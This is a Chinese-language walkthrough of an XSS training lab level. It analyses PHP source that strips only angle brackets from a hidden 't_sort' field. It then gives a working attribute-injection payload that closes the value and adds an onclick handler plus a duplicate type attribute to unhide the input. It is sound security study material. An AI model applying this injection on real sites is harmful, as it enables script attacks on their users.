

这关没有输入框，看url链接有?keyword=
  试着注入，无果
  
看了源码才发现注入点不是 keyword，是 `t_sort` 参数

## 查看分析源码

```php
$str = $_GET["keyword"];                          // htmlspecialchars 护了
$str11 = $_GET["t_sort"];                         // ★ 真正注入点
$str22 = str_replace(">","",$str11);              // 删 >
$str33 = str_replace("<","",$str22);              // 删 <

echo '<input name="t_sort" value="'.$str33.'" type="hidden">';
```

keyword 被 htmlspecialchars 转义了没戏，注入在 `t_sort` 参数上

删了 `<>` → 事件注入路线

但这 input 是 `type="hidden"` → 看不见也点不到，onfocus/autofocus 不触发

先把它改成 `type="text"` 显示出来，再绑事件

## 构造 payload

keyword 随便填，payload 走 t_sort 参数：

```
?keyword=1&t_sort=" onclick="alert(1)" type="text"
```

或者直接删除?keyword=

```
?t_sort=" onclick="alert(1)" type="text"
```
![](99_Attachments/图片/level10/file-20260617195332430.png)
把 type 属性写两遍，浏览器取前面那个：

```html
<input name="t_sort" value="" onclick="alert(1)" type="text" type="hidden">
                         ↑___↑ ↑____________________↑ ↑________↑ ↑__________↑
                    关value     onclick事件           改text    源码hidden被盖掉
```

点一下输入框弹窗。关键点：**hidden 不是死局——写两遍 type 属性，前面的覆盖后面的**。